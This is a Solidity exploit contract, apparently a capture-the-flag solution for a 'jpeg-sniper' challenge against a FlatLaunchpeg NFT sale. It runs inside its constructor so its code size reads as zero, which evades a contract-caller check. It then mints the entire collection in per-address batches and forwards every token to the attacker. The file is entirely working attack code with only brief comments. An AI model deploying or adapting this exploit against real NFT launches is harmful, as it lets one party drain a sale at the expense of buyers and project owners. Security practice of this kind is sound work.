pragma solidity ^0.8.0;

import "../jpeg-sniper/FlatLaunchpeg.sol";

contract JpegSniperHack {

    // Exploit needs to be performed in the constructor so this address returns a contract size of zero.
    constructor(FlatLaunchpeg _nft) {
        run(_nft);
    }

    function run(FlatLaunchpeg nft) public {
        uint maxPerMint = nft.maxPerAddressDuringMint();
        uint maxSupply = nft.collectionSize();
        uint mintCalls = maxSupply / maxPerMint;

        // Mint NFTs in batches then transfer from the contract to the attacker between batches
        for(uint i = 0; i < mintCalls; i++) {
            nft.publicSaleMint(maxPerMint);
            for(uint j = i * maxPerMint; j < (i * maxPerMint) + maxPerMint; j++) {
                nft.transferFrom(address(this), msg.sender, j);
            }
        }
        uint remaining = maxSupply - nft.totalSupply();
        if(remaining > 0) {
            nft.publicSaleMint(remaining);
            for(uint j = maxSupply - 1; j >= maxSupply - remaining; j--) {
                nft.transferFrom(address(this), msg.sender, j);
            }
        }
    }
}